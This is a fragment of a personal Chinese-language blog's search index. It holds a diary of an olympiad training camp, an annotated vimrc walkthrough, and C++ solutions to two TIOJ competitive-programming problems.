前一天東東跟曹宸睿跑去住宿，似乎是住在捷絲旅（好好），不過他們的晚餐費只有一百元XD\n至於我則是在考完資格考後又忙著去YTP初賽，並且發現自己被最後一題電爆QQ\n因為17號是鳥人食雞日所以我拉一些人去ㄘ鳥人，加上加點的總共可以有八片雞肉叉燒，超爽。\n週六 前一天不知道吃了什麼毒超早睡OAO可是起床又超晚，最後遲到了十幾分鐘到，不過好像是沒差owo\n早上是王弘倫教授講IOI的詳細規則，詳細到我不知道怎麼形容。\n他還講了四模pC的題解(?)還有丟一題 Christmas 類似斜率優化但是好像有四邊形優化的性質，總之一整個好強OAO。\n下午跑去西門町訂做西裝，原本以為會是常常看到的那種沒什麼裝潢普通店面（海派那種），結果是一家看起來超高級的西裝店，\n好像叫ElegaZzle，之前應該是完全沒聽說過\n我們一群人都是穿著T-shirt加短褲還有布鞋，我一整個鄉下人長見識了(?)\n選定布料還有樣式的時候選有夠久，三個人一起選還是有選擇障礙，尤其因為選擇超多，大概有幾十種布料可以選擇\n選了西裝的布料後又得選領口的樣式、襯衫的布料、襯衫的樣式、鈕扣、袖口要繡上的名字blablabla。\n總之做了很困難的選擇之後來到更困難的部分：量尺寸\n我超胖QQ太sad了，一開始大概量了一個尺寸換上去後肚子那邊好緊（眼睛也看的出來）\n然後我還被要求在門口量尺寸QQ，超級羞恥play(#\n順帶一提這家店有一個很酷的房間可以掃描人體的3D模型，還有跟手機的藍芽弄一些特效，聽說曹宸睿的手機有閃退一次XD\n我們每一餐的餐費是一百元，我們決定把午餐和晚餐合在一起變成兩百元，這樣就可以ㄘ拉麵了，\n話說我這天也沒吃早餐，只靠一餐拉麵果腹，爽！\n好笑的是今天又跑去ㄘ鳥人（因為西門町太近ㄌ而且他們上次剛好錯過）\n這天嘗試了辛白湯，實在是頗辣的不過還不錯吃啦\n然後後來跑去踩踩安利美特、又走到北車地下街Y區，看到好多軟軟\u0026lt;3\u0026lt;3\n不過都沒買任何東西感覺有點浪費時間(#\n噢，最覺得浪費時間的可能是我跑去打音遊另外兩個人站在後面看的尷尬時間。\n周日 隔天早上沒有課，他們兩個又說晚半小時到，於是我想說可以安心吃早餐慢慢出門， 結果我還是晚他們到XD\n因為我前一天不小心玩壞OJDL，所以這個早上花了不少時間來修。\n一切的主因都是因為沒事update東西QQ，造成的影響到現在還沒修完\n這天修好的 bug 好像是因為沙盒有限制記憶體之類的，但是 update 之後的執行檔編譯出來不知道為什麼就爆炸了(?)\n好像在 g++ 的選項加個 -static 就修好了，完全不知道為什麼之前不會出事更新就會出事。\n下午的講師是張經略教授（對就是加菲貓教授）\n他仍然超酷，講的主題是 subexponential algorithms。首先講了subset sum和0/1背包的meet in the middle作法，中途還一直說「這個部分我不會……所以時間複雜度就是 $2^{N/2}$ + 我不會 + $2^{N/2} \\cdot (N/2)$ ……」，超好笑，O(我不會)的演算法。接著講了一個 $O^{ \\star }(3^{N/2})$ 的3-SAT確定性演算法，並且還有講了 $O^{ \\star }(3^{N/4})$的隨機演算法和一個O(我不會)的隨機演算法XD。\n接下來就變成討論「1-median selection in metric space」的一大堆東西， 這個問題主要是在問給一堆點，你要找到與其他點平均距離最小的一個點，很神奇的是可以隨機選一個夠多點的subset，然後對每個點只算與這個subset的平均距離之類的，會得到一個近似解。\n教授也分享了很多相關的結果，例如壓掉一個log或是在某種條件下變成超級好的複雜度之類的\n總之很難理解但是我大致上就邊開水題邊聽他講證明，可能因為我前一天晚睡超想睡覺的，最後真的累到不行了XD\n下午再度拉麵行，本來要去吃雞二但是又是到現場才發現他公休，明明google有寫qqq我超雷\n於是想說在附近隨便找吃的又放棄了，最後變成去中山站吃武藏神山（完全不知道為啥）\n加麵真香，雖然我好像不小心選到這家略貴，不過有些許甜味的厚叉燒兩片還是值得的！粗麵和湯頭我也很喜歡。\n接著就走路到北車，各自搭車解散 OwO！\n寫題呢QQ 我本來以為會刷一些OI題，不過看來我自己也還沒什麼動力（\n東東好像有一個ICPC培訓班的考試，十題裡面需要作出七題，而且全都超難的。\n全部應該都是OI題，有些我想半天都想不出來QQ\n我覺得我絕對就是那種少一點練習很快就退步的選手，\n這幾天就先從刷CF題開始吧(#\n還有希望暑假自己可以開心\u0026gt; \u0026lt;雖然很多事要掛心，不過跟其他人比起來我已經少很多煩躁ㄌ！\n話說這篇圖片好多，希望大家不要在半夜點進來發現太餓(X\n","permalink":"https://omeletwithoutegg.github.io/2020/07/20/TOI-2020-7-18-weekend/","tags":null,"title":"國培 week 1"},{"contents":"vim ?! vim : 古老的編輯器\n新文章\n來由 之前 ZCK 很早就開始一直推坑 vim ，而我大概是在開始瘋狂玩 OJDL 之後才開始使用 vim 的\n因為在遠端 server 上改 code 最直接的方式就是使用遠端主機上的 vim 直接在 ssh 的介面改\n所以經過幾個月(我也不知道具體多久)我大概熟悉 vim 了之後，在我的筆電上也裝了 gvim\n因為是 windows 的所以用起來很怪，不過經過 Google 一些設定之後變得正常一些了\n至於我的筆電呢，我覺得裝 linux 的必要性還沒有麻煩性高(X\n而且感覺arch \u0026gt; Ubuntu但是裝了arch又會因為更新速度出現各種神奇的事件\n所以姑且先不裝(?)\n一些心得 我覺得 vim 的優點可能就是讓你可以只使用鍵盤編輯文件，\n再來就是你可以依照自己的喜好更改 vimrc 或是安裝插件\n此外記憶這些快捷鍵也是很有成就感的事情(?)\n變魔法的快速鍵就跟突然講起德語或上古漢語一樣吸引人目光\nmy vimrc 附上我自己的 vimrc\n一開始我沒有裝任何插件，後來查到一篇使用 Vundle 的就去載了\n最後跟風(?)改成用 vim-plug 管理所有插件\n物色自己喜歡的插件真的很難，可能害我熬夜了好幾次QQ\n不知道過了一段時間之後我的 vimrc 又會變成什麼樣子\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 set nocompatible set encoding=utf8 set fileencoding=utf8 \u0026#34;\u0026#34;\u0026#34; Plugins, use \u0026#39;vim-plug\u0026#39; to manage plugins call plug#begin(\u0026#39;~/.vim/plugged\u0026#39;) Plug \u0026#39;hzchirs/vim-material\u0026#39; \u0026#34; Plug \u0026#39;flazz/vim-colorschemes\u0026#39; Plug \u0026#39;itchyny/lightline.vim\u0026#39; \u0026#34; Plug \u0026#39;vim-airline/vim-airline\u0026#39; Plug \u0026#39;mhinz/vim-startify\u0026#39; Plug \u0026#39;tpope/vim-fugitive\u0026#39; \u0026#34; :G [option] for git commands Plug \u0026#39;preservim/nerdtree\u0026#39;, { \u0026#39;on\u0026#39;: \u0026#39;NERDTreeToggle\u0026#39; } \u0026#34; \u0026lt;F2\u0026gt; for toggle nerdtree Plug \u0026#39;Xuyuanp/nerdtree-git-plugin\u0026#39;, { \u0026#39;on\u0026#39;: \u0026#39;NERDTreeToggle\u0026#39; } \u0026#34; git status Plug \u0026#39;kien/ctrlp.vim\u0026#39;, { \u0026#39;on\u0026#39;: \u0026#39;NERDTreeToggle\u0026#39; } \u0026#34; \u0026lt;C-p\u0026gt; for found file Plug \u0026#39;tpope/vim-commentary\u0026#39; \u0026#34; gc for comment \u0026#34; Plug \u0026#39;yuttie/comfortable-motion.vim\u0026#39; Plug \u0026#39;joker1007/vim-markdown-quote-syntax\u0026#39; \u0026#34; Plug \u0026#39;octol/vim-cpp-enhanced-highlight\u0026#39; call plug#end() \u0026#34; let c_no_curly_error=1 \u0026#34; enhanced highlight issue \u0026#34;\u0026#34;\u0026#34; GUI settings if has(\u0026#39;gui_running\u0026#39;) au GUIEnter * simalt ~x \u0026#34; maximize window set guioptions-=m | set guioptions-=e | set guioptions-=T \u0026#34; menu | tab page | toolbar set guioptions-=L | set guioptions-=R | set guioptions-=l | set guioptions-=r \u0026#34; left scrollbar | right scrollbar | left scrollbar (split) | right scrollbar (split) set guifont=Microsoft\\ Yahei\\ Mono:h14 \u0026#34; for Windows endif \u0026#34;\u0026#34;\u0026#34; Appearance \u0026#34; startify#center([\u0026#39;VIM - Vi IMproved\u0026#39;, \u0026#39;JIZZZZZZZZZZZZZZZ\u0026#39;, \u0026#39;OmeletWithoutEgg\u0026#39;]) let g:startify_custom_header = [] let g:startify_bookmarks = [\u0026#39;~/_vimrc\u0026#39;, \u0026#39;D:/project/randgum\u0026#39;, \u0026#39;D:/C++\u0026#39;, \u0026#39;D:/blog\u0026#39;] \u0026#34; :h g:lightline.colorscheme let g:lightline = { \\ \u0026#39;colorscheme\u0026#39;: \u0026#39;materia\u0026#39;, \\ \u0026#39;active\u0026#39;: { \u0026#39;left\u0026#39;: [ [ \u0026#39;mode\u0026#39;, \u0026#39;paste\u0026#39; ], [ \u0026#39;readonly\u0026#39;, \u0026#39;filename\u0026#39;, \u0026#39;modified\u0026#39;, \u0026#39;gitbranch\u0026#39; ] ] }, \\ \u0026#39;component_function\u0026#39;: { \u0026#39;gitbranch\u0026#39;: \u0026#39;FugitiveHead\u0026#39; } \\ } color vim-material \u0026#34; color desert au ColorScheme * hi Comment cterm=none gui=none | hi Search ctermfg=yellow guifg=yellow \u0026#34; disable italic comment and enable highlight search color \u0026#34;\u0026#34;\u0026#34; Basic Configuration syntax on set nu rnu ai bs=2 et sw=4 sts=4 hls set belloff=all laststatus=2 set cursorline noshowmode lazyredraw termguicolors augroup rnutoggle au! au InsertEnter,InsertLeave * set rnu! augroup END \u0026#34;\u0026#34;\u0026#34; Edit Mappings inoremap \u0026lt;C-c\u0026gt; \u0026lt;Esc\u0026gt; inoremap {\u0026lt;CR\u0026gt; {\u0026lt;CR\u0026gt;}\u0026lt;C-o\u0026gt;O nnoremap ya :%y+\u0026lt;CR\u0026gt; nnoremap \u0026lt;silent\u0026gt; \u0026lt;C-TAB\u0026gt; :tabn\u0026lt;CR\u0026gt; nnoremap \u0026lt;silent\u0026gt; \u0026lt;C-S-TAB\u0026gt; :tabp\u0026lt;CR\u0026gt; nnoremap \u0026lt;silent\u0026gt; \u0026lt;C-n\u0026gt; :tabnew\u0026lt;CR\u0026gt;:Startify\u0026lt;CR\u0026gt; nnoremap \u0026lt;silent\u0026gt; \u0026lt;A-j\u0026gt; :m.1\u0026lt;CR\u0026gt;== nnoremap \u0026lt;silent\u0026gt; \u0026lt;A-k\u0026gt; :m.-2\u0026lt;CR\u0026gt;== vnoremap \u0026lt;silent\u0026gt; \u0026lt;A-j\u0026gt; :m \u0026#39;\u0026gt;+1\u0026lt;CR\u0026gt;gv=gv vnoremap \u0026lt;silent\u0026gt; \u0026lt;A-k\u0026gt; :m \u0026#39;\u0026lt;-2\u0026lt;CR\u0026gt;gv=gv vnoremap \u0026gt; \u0026gt;gv vnoremap \u0026lt; \u0026lt;gv nnoremap \u0026lt;silent\u0026gt; \u0026lt;F2\u0026gt; :cd %:h\u0026lt;CR\u0026gt;:NERDTreeToggle\u0026lt;CR\u0026gt; \u0026#34;\u0026#34;\u0026#34; Build Commands au BufEnter *.cpp call CppFastBuild() function CppFastBuild() nnoremap \u0026lt;F9\u0026gt; :w\u0026lt;CR\u0026gt;:!g++ % -o %:r -std=c++17 -Dlocal\u0026lt;CR\u0026gt;:!%:r\u0026lt;CR\u0026gt;\u0026lt;CR\u0026gt; nnoremap \u0026lt;F10\u0026gt; :!%:r\u0026lt;CR\u0026gt;\u0026lt;CR\u0026gt; endfunction au BufEnter *.py call PythonFastBuild() function PythonFastBuild() nnoremap \u0026lt;F10\u0026gt; :w\u0026lt;CR\u0026gt;:cd %:h\u0026lt;CR\u0026gt;:!%\u0026lt;CR\u0026gt;\u0026lt;CR\u0026gt; nnoremap \u0026lt;F8\u0026gt; :w\u0026lt;CR\u0026gt;:cd %:h\u0026lt;CR\u0026gt;:!cmd\u0026lt;CR\u0026gt;\u0026lt;CR\u0026gt; endfunction 順帶一提在windows的gvim底下的vimrc路徑是 $HOME/_vimrc\n詳細解析! 為了推坑我用的所有東西我要來一一解釋他們的功能 owo\nPlugins 我使用vim-plug來管理插件們\n1 2 3 4 \u0026#34;\u0026#34;\u0026#34; Plugins, use \u0026#39;vim-plug\u0026#39; to manage plugins call plug#begin(\u0026#39;~/.vim/plugged\u0026#39;) ... call plug#end() 用法非常簡單，而且自己用了什麼插件都一眼就能看出來，超棒的XD\nDisplay vim-material：我現在用的 colorscheme vim-colorschemes：一個有很多 colorscheme 的 plugin，可以考慮從這裡開始物色喜歡的 lightline：底下的狀態列，用起來就是潮 airline：另一種狀態列，比較好看，但是對 windows 還是中文不友善所以我沒裝 startify 這超棒，讓你打開 vim 的時候會顯示最近的檔案，還有自訂 bookmark 跟 session 的功能(?)不過我還在摸索 Files and Git 在做專案的時候，樹狀目錄和git的功能肯定是不能少的\n尤其是裝了 nerdtree 這個插件後根本就變成IDE的樣子了XDD\nvim-fugitive：似乎是增強一些 git 的功能 nerdtree：可以在旁邊顯示樹狀目錄，做專案的時候頗有用 nerdtree-git-plugin：如果檔案有被 git 管理會在 nerdtree 顯示 git 狀態 ctrlp：尋找檔案的一個插件，不過我好像很少用\n注意到後面我有加 , { 'on': 'NERDTreeToggle' } ，也就是說這些插件在我開啟 nerdtree 時才會被 load 到 vim 裡面 Misc (?) vim-commentary：為程式碼加上註解的快捷鍵 comfortable-motion：讓畫面在滑動的時候可以連續、平順的移動 vim-markdown-quote-syntax：可以幫 markdown 程式碼區塊上色，另外有一些 vim 跟 markdown 有關的插件不過我試用過後是覺得沒啥用處就刪掉了 vim-cpp-enhanced-highlight：幫 STL 容器等等更多 keyword 上色，不過我現在也沒開著這個功能。有一個括弧上色的錯誤還必須透過 let c_no_curly_error=1 來解決 GUI settings 首先第一行可以讓我怎麼打開 vim 都會幫我最大化螢幕\n因為我用的是 gvim ，所以預設會有一些選單和工具欄還有捲動條，我把他們全部禁用掉\n另外設定字體也只有有 GUI 的 vim 才能設置，終端機的 vim 會直接是終端機介面的字型\n我不太知道有什麼 windows 上包含中文的等寬字體，於是選用 Microsoft Yahei Mono ，英文是 Consolas 中文是雅黑體\n1 2 3 4 5 6 7 8 if has(\u0026#39;gui_running\u0026#39;) au GUIEnter * simalt ~x \u0026#34; maximize window set guioptions-=m | set guioptions-=e | set guioptions-=T \u0026#34; menu | tab page | toolbar set guioptions-=L | set guioptions-=R | set guioptions-=l | set guioptions-=r \u0026#34; left scrollbar | right scrollbar | left scrollbar (split) | right scrollbar (split) set guifont=Microsoft\\ Yahei\\ Mono:h14 \u0026#34; for Windows endif Appearance 1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026#34; startify#center([\u0026#39;VIM - Vi IMproved\u0026#39;, \u0026#39;JIZZZZZZZZZZZZZZZ\u0026#39;, \u0026#39;OmeletWithoutEgg\u0026#39;]) let g:startify_custom_header = [] let g:startify_bookmarks = [\u0026#39;~/_vimrc\u0026#39;, \u0026#39;D:/project/randgum\u0026#39;, \u0026#39;D:/C++\u0026#39;, \u0026#39;D:/blog\u0026#39;] \u0026#34; :h g:lightline.colorscheme let g:lightline = { \\ \u0026#39;colorscheme\u0026#39;: \u0026#39;materia\u0026#39;, \\ \u0026#39;active\u0026#39;: { \u0026#39;left\u0026#39;: [ [ \u0026#39;mode\u0026#39;, \u0026#39;paste\u0026#39; ], [ \u0026#39;readonly\u0026#39;, \u0026#39;filename\u0026#39;, \u0026#39;modified\u0026#39;, \u0026#39;gitbranch\u0026#39; ] ] }, \\ \u0026#39;component_function\u0026#39;: { \u0026#39;gitbranch\u0026#39;: \u0026#39;FugitiveHead\u0026#39; } \\ } color vim-material \u0026#34; color desert au ColorScheme * hi Comment cterm=none gui=none | hi Search ctermfg=yellow guifg=yellow \u0026#34; disable italic comment and enable highlight search color startify 最上面預設會顯示一隻不知道什麼生物說出隨機名人的名言，不過我覺得太占空間於是選擇都不顯示，另外也可以用任何自定義的文字或 ascii art。\nstartify 的書籤似乎有更好的使用方法，不過我目前是 hardcode 寫在這裡\nlightline 超潮的，還可以跟 fugitive 配合一起用\n我的 colorscheme vim-material 的 C++ 註解是斜體的，會讓我模板的AC變得不好看所以我下面把它給取消；另外搜尋時預設是底線但我覺得太不清楚於是加上黃色凸顯搜尋結果\n順帶一提 au 是 autocmd 的縮寫，hi 是 highlight 的縮寫， color 是 colorscheme 的縮寫\nBasic Configuration 1 2 3 4 5 6 7 8 syntax on set nu rnu ai bs=2 et sw=4 sts=4 hls set belloff=all laststatus=2 set cursorline noshowmode lazyredraw termguicolors augroup rnutoggle au! au InsertEnter,InsertLeave * set rnu! augroup END 這些設定是在終端機也可以用的(應該啦)\nsyntax on：開啟 syntax highlight set nu rnu：分別是number跟relativenumber的縮寫，顯示絕對與相對行號 set ai：autoindent，自動接續上一行縮排。雖然似乎檔名是 cpp 的話就會好好幫你自動縮排 set bs=2：等價於set backspace=indent,eol,start，讓 backspace 可以刪除換行、自動產生的縮排還有在進入該次 insert mode 之前打的字 set et sw=4 sts=4：等價於set expandtab shiftwidth=4 softtabstop=4，因為我習慣讓所有縮排從 tab 變成 4 個空白 set hls：在搜尋的時候能夠高亮度凸顯 set belloff=all：關掉錯誤時的鈴聲 set laststatus=2：顯示狀態列 set cursorline：在當前游標那一行上色 set noshowmode：因為 lightline 已經有顯示目前模式所以不需要再額外顯示目前模式 set lazyredraw：有些 macro 執行會有點雜亂所以讓他先執行完再顯示最後結果就好 set termguicolors：原本是想讓終端機也能好好上色，不過我好像不可能會在 windows 上用終端機的 vim XD\n最後的 augroup 是我希望在 insert mode 和其他模式下分別會顯示絕對行號和相對行號 Mappings 1 2 3 inoremap \u0026lt;C-c\u0026gt; \u0026lt;Esc\u0026gt; inoremap {\u0026lt;CR\u0026gt; {\u0026lt;CR\u0026gt;}\u0026lt;C-o\u0026gt;O nnoremap ya :%y+\u0026lt;CR\u0026gt; 因為 esc 離我太遠了所以我最近開始用 Ctrl+C 代替，不過它不會被幫我執行切換絕對與相對行號的 autocmd 偵測到，所以我又跑去 map 它\n在一些嘗試之後我發現只有大括弧的補全我延續得比較順手以及美觀，我設定在上大括弧後若換行則會補上下大括弧並在中間插入一行\n在打 CF 的時候常常會用到全選但是四個字的指令讓人很急所以我 map ya 當作全選\n1 2 3 nnoremap \u0026lt;silent\u0026gt; \u0026lt;C-TAB\u0026gt; :tabn\u0026lt;CR\u0026gt; nnoremap \u0026lt;silent\u0026gt; \u0026lt;C-S-TAB\u0026gt; :tabp\u0026lt;CR\u0026gt; nnoremap \u0026lt;silent\u0026gt; \u0026lt;C-n\u0026gt; :tabnew\u0026lt;CR\u0026gt;:Startify\u0026lt;CR\u0026gt; 這三個是關於開新分頁，我在 code::blocks 和 chrome 都習慣會切分頁\n另外我發現 startify 很適合放在新增一個分頁的時候\n1 2 3 4 5 6 nnoremap \u0026lt;silent\u0026gt; \u0026lt;A-j\u0026gt; :m.1\u0026lt;CR\u0026gt;== nnoremap \u0026lt;silent\u0026gt; \u0026lt;A-k\u0026gt; :m.-2\u0026lt;CR\u0026gt;== vnoremap \u0026lt;silent\u0026gt; \u0026lt;A-j\u0026gt; :m \u0026#39;\u0026gt;+1\u0026lt;CR\u0026gt;gv=gv vnoremap \u0026lt;silent\u0026gt; \u0026lt;A-k\u0026gt; :m \u0026#39;\u0026lt;-2\u0026lt;CR\u0026gt;gv=gv vnoremap \u0026gt; \u0026gt;gv vnoremap \u0026lt; \u0026lt;gv 這些是我從 code::blocks 帶來的習慣，我常常把一行或一塊程式碼上下拉，或者增加/減少縮排等等\n1 nnoremap \u0026lt;silent\u0026gt; \u0026lt;F2\u0026gt; :cd %:h\u0026lt;CR\u0026gt;:NERDTreeToggle\u0026lt;CR\u0026gt; 我讓 F2 是開啟當前檔案的樹狀目錄的快捷鍵\nBuild Commands 身為一個前 code::blocks 使用者，快速編譯是不可少的\n在前面加了 :w 讓我不用按存檔再編譯\n自定義這些鍵位真舒服\n1 2 3 4 5 6 7 8 9 10 11 au BufEnter *.cpp call CppFastBuild() function CppFastBuild() nnoremap \u0026lt;F9\u0026gt; :w\u0026lt;CR\u0026gt;:!g++ % -o %:r -std=c++17 -Dlocal\u0026lt;CR\u0026gt;:!%:r\u0026lt;CR\u0026gt;\u0026lt;CR\u0026gt; nnoremap \u0026lt;F10\u0026gt; :!%:r\u0026lt;CR\u0026gt;\u0026lt;CR\u0026gt; endfunction au BufEnter *.py call PythonFastBuild() function PythonFastBuild() nnoremap \u0026lt;F10\u0026gt; :w\u0026lt;CR\u0026gt;:cd %:h\u0026lt;CR\u0026gt;:!%\u0026lt;CR\u0026gt;\u0026lt;CR\u0026gt; nnoremap \u0026lt;F8\u0026gt; :w\u0026lt;CR\u0026gt;:cd %:h\u0026lt;CR\u0026gt;:!cmd\u0026lt;CR\u0026gt;\u0026lt;CR\u0026gt; endfunction 結語 一個完全客製化的編輯器真的頗吸引人，不過有時候還是得妥協的地方\n找插件找超久不如改變自己的習慣或是 vimrc 來解決問題(或者解決提出問題的人XD)\n另外最近好久沒發文，好廢喔，不知道下一篇題解會什麼時候出現(?)\n","permalink":"https://omeletwithoutegg.github.io/2020/07/08/Using-Vim/","tags":["vim","linux"],"title":"Using-Vim"},{"contents":"Ch2. Section 9. 補魔力的條件 https://tioj.ck.tp.edu.tw/problems/1764\nDescription 現在有排成一直線的$N$個格子，從左到右編號為$1 \\dots N$，每個格子都有自己的高度 一開始你站在第一格，每次移動都只能往編號大的格子跳，目標是走到第$N$格 假設第$i$個格子的高度是$x_i$，從格子$i$跳到格子$j$需要耗費$\\max(0, (j-i)+(x_j-x_i))$的力氣\n請問在花最少力氣到達終點的前提下，他最多可以跳幾次? Solution 先考慮最小化力氣\n令$x_i+i = v_i$，簡單的列出DP式\n$$\ndp[i] = \\min _ {j \u0026lt; i}(dp[j] + \\max(0,v_j-v_i))\n$$\n這樣的複雜度是$\\mathcal{O}(N^2)$\n不過可以分case討論\n$$\ndp[i] = \\min(\n\\min _ {j \u0026lt; i \\wedge v_j \\geq v_i}(dp[j]+v_j)-v_i,\n\\min _ {j \u0026lt; i \\wedge v_j \u0026lt; v_i}(dp[j])\n)\n$$\n就可以用資料結構$\\mathcal{O}(N \\log N)$維護了\n那麼最多可以跳的次數也可以一邊維護\n也就是說如果力氣不同就選力氣小的，力氣相同則選跳的次數多的，可以直接用pair做就好\n這邊寫的是值域壓縮之後用BIT維護前後綴min OAO\nAC code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 #pragma GCC optimize(\u0026#34;Ofast\u0026#34;) #pragma loop_opt(on) #include \u0026lt;bits/stdc++.h\u0026gt; #define ff first #define ss second using namespace std; typedef int64_t ll; constexpr ll N = 300025, INF = 1e18; struct BIT { pair\u0026lt;ll,int\u0026gt; mn[N]; int n; void init(int _n) { n = _n; for(int i = 1; i \u0026lt;= n; i++) mn[i] = {INF, 0}; } void edit(int p, pair\u0026lt;ll,int\u0026gt; d) { for(; p \u0026lt;= n; p += p\u0026amp;-p) mn[p] = min(mn[p], d); } pair\u0026lt;ll,int\u0026gt; query(int p) { pair\u0026lt;ll,int\u0026gt; res = {INF, 0}; for(; p \u0026gt; 0; p -= p\u0026amp;-p) res = min(res, mn[p]); return res; } } pre, suf; signed main() { ios_base::sync_with_stdio(0), cin.tie(0); // dp[i] = min{dp[j] + max(v[i] - v[j], 0)}; // dp[i] = min{v[i] + dp[j]-v[j] | v[i] \u0026gt;= v[j]}, min{dp[j] | v[i] \u0026lt; v[j]} // dp[1] = {0, 0} int n, m; cin \u0026gt;\u0026gt; n \u0026gt;\u0026gt; m; vector\u0026lt;int\u0026gt; h(n); for(int \u0026amp;x: h) cin \u0026gt;\u0026gt; x; vector\u0026lt;int\u0026gt; u = h; sort(u.begin(), u.end()), u.erase(unique(u.begin(), u.end()), u.end()); for(int \u0026amp;x: h) x = lower_bound(u.begin(), u.end(), x) - u.begin() + 1; pre.init(u.size()); suf.init(u.size()); pre.edit(h[0], {-h[0], 0}); suf.edit(u.size()+1-h[0], {0, 0}); pair\u0026lt;ll,int\u0026gt; dp; for(int i = 1; i \u0026lt; n; i++) { pair\u0026lt;ll,int\u0026gt; a = pre.query(h[i]), b = suf.query(u.size()-h[i]); a.ff += h[i]; dp = min(a,b); dp.ss -= 1; suf.edit(u.size()+1-h[i], dp); dp.ff -= h[i]; pre.edit(h[i], dp); } cout \u0026lt;\u0026lt; min(m, -dp.ss) \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; } ","permalink":"https://omeletwithoutegg.github.io/2020/05/12/TIOJ-1764/","tags":["TIOJ","dp","data-structure"],"title":"TIOJ-1764"},{"contents":"序列維護問題 https://tioj.ck.tp.edu.tw/problems/1633\nDescription 有一個由1到N的數字排成的序列。\n可是你對於現在這個排列很不滿意，決定透過一些操作改變這個序列。\n你現在有兩種操作：\nREV L R ：把L到R所有數字反轉順序，例如1 2 3 4變成4 3 2 1 SWAP L1 R1 L2 R2：把L1到R1所有數字跟L2到R2所有數字交換位置，但順序不變。 你總共進行了M次操作，請輸出最後序列的樣子。\nSolution 平衡二元樹裸題，我用的是Treap\n要反轉的話可以打懶標(?)然後記得push\nAC code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 #pragma GCC optimize(\u0026#34;Ofast\u0026#34;) #pragma loop_opt(on) #include \u0026lt;cstdio\u0026gt; #include \u0026lt;random\u0026gt; const int N = 130025; inline char readchar() { constexpr int B = 1\u0026lt;\u0026lt;20; static char buf[B], *p, *q; if(p == q \u0026amp;\u0026amp; (q=(p=buf)+fread(buf,1,B,stdin)) == buf) return EOF; return *p++; } inline int nextint() { int x = 0, c = readchar(); while(c \u0026lt; \u0026#39;0\u0026#39;) c = readchar(); while(c \u0026gt;= \u0026#39;0\u0026#39;) x=x*10+(c^\u0026#39;0\u0026#39;), c=readchar(); return x; } inline void readuntil(char *s, char esc = \u0026#39;\\n\u0026#39;) { char c = readchar(); while(c != esc) *s++ = c, c = readchar(); } std::mt19937 rnd(7122); struct BST { struct node { int pri, sz, rev; int l, r; } S[N]; void flip(int x) { S[x].rev = !S[x].rev; std::swap(S[x].l, S[x].r); } void pull(int x) { S[x].sz = S[S[x].l].sz + 1 + S[S[x].r].sz; } void push(int x) { if(!S[x].rev) return; flip(S[x].l), flip(S[x].r); S[x].rev = false; } void split(int o, int \u0026amp;a, int \u0026amp;b, int k) { if(!o) return a = b = 0, void(); push(o); int s = S[S[o].l].sz + 1; //debug(k,s,o,S[o].l); if(k \u0026lt; s) b = o, split(S[o].l, a, S[b].l, k), pull(b); else a = o, split(S[o].r, S[a].r, b, k - s), pull(a); } int join(int a, int b) { if(!a || !b) return a ? a : b; push(a), push(b); if(S[a].pri \u0026lt; S[b].pri) return S[a].r = join(S[a].r, b), pull(a), a; else return S[b].l = join(a, S[b].l), pull(b), b; } void dfs(int i, bool r = true, int d = 0) { if(!i) return; push(i); dfs(S[i].l, 0, d+1); printf(\u0026#34;%d%c\u0026#34;, i, (r \u0026amp;\u0026amp; !S[i].r ? \u0026#39;\\n\u0026#39; : \u0026#39; \u0026#39;)); dfs(S[i].r, r, d+1); } } trp; signed main() { //ios_base::sync_with_stdio(0), cin.tie(0); int n=nextint(), q=nextint(); int root = 0; for(int i = 1; i \u0026lt;= n; i++) trp.S[i] = {rnd(), 1, 0, 0, 0}, root = trp.join(root, i); //trp.dfs(root); while(q--) { char com[5]; readuntil(com, \u0026#39; \u0026#39;); if(com[0] == \u0026#39;R\u0026#39;) { int a, b, c, l, r; l = nextint(), r = nextint(); trp.split(root, b, c, r); trp.split(b, a, b, l-1); trp.flip(b); //cout \u0026lt;\u0026lt; \u0026#34;rev \u0026#34;; //trp.dfs(b); root = trp.join(a, trp.join(b,c)); } else { int l1, r1, l2, r2, a, b, c, d, e; l1 = nextint(), r1 = nextint(), l2 = nextint(), r2 = nextint(); trp.split(root, d, e, r2); trp.split(d, c, d, l2-1); trp.split(c, b, c, r1); trp.split(b, a, b, l1-1); root = trp.join(a, trp.join(d, trp.join(c, trp.join(b, e)))); } } trp.dfs(root); } ","permalink":"https://omeletwithoutegg.github.io/2020/05/08/TIOJ-1633/","tags":["TIOJ","data-structure"],"title":"TIOJ-1633"},{"contents":"二階奇幻之旅 原本一段剛好和一階撞到，可以免考，但是因為疫情的緣故又錯過了\n不過在我們從一階回來之後傳出師大那邊有確診的消息，而且還跟我們用過同一間教室(?)\n所以我們就剛好利用防疫公假得到免考的資格，嘻嘻\n防疫公假? 在自主健康管理的這段期間，我除了家裡基本上都待在王政祺家地下室\n寒假的時候去那邊都是在打桌遊，不過這個禮拜去不是在刷題就是在刷題XD\n有戳了一些POI還是BOI，不過POI真的好怪，什麼官解一兩百行特判的數學題之類的\nAY來的時候他會丟CF的題目，然後帶我們吃超多拉麵\n不過我真的對蒜不行\u0026gt;\u0026lt;\n二階 